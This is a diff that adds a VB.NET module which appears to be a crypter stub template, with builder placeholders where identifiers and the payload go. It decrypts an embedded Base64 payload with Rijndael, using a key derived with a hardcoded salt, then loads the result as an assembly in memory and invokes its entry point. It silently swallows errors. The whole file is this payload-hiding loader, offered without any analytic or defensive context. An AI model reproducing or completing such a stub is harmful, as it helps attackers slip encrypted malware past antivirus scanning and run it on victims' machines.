@@ -1,0 +1,35 @@
+    Imports System.Security.Cryptography
+
+Module omar_iraq
+	Sub main()
+	    
+        Dim %1% As String = "%2%"
+        Dim %3% As Byte() = Convert.FromBase64String(%6%(%1% , "%8%"))
+
+
+
+        Dim %4% As System.Reflection.Assembly = System.Reflection.Assembly.Load(%3% )
+        %4%.EntryPoint.Invoke(Nothing, Nothing)
+
+
+    End Sub
+    Public Function %6%(ByVal UDecryptU As String, ByVal UKeyU As String)
+        Dim %7% As New RijndaelManaged
+        Dim XbtCipherX() As Byte
+        Dim XbtSaltX() As Byte = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}
+        Dim XoKeyGeneratorX As New Rfc2898DeriveBytes(UKeyU, XbtSaltX)
+        %7%.Key = XoKeyGeneratorX.GetBytes(%7%.Key.Length)
+        %7%.IV = XoKeyGeneratorX.GetBytes(%7%.IV.Length)
+        Dim XmsX As New IO.MemoryStream
+        Dim XcsX As New CryptoStream(XmsX, %7%.CreateDecryptor(), _
+          CryptoStreamMode.Write)
+        Try
+            XbtCipherX = Convert.FromBase64String(UDecryptU)
+            XcsX.Write(XbtCipherX, 0, XbtCipherX.Length)
+            XcsX.Close()
+            UDecryptU = System.Text.Encoding.UTF8.GetString(XmsX.ToArray)
+        Catch
+        End Try
+        Return UDecryptU
+    End Function
+End Module
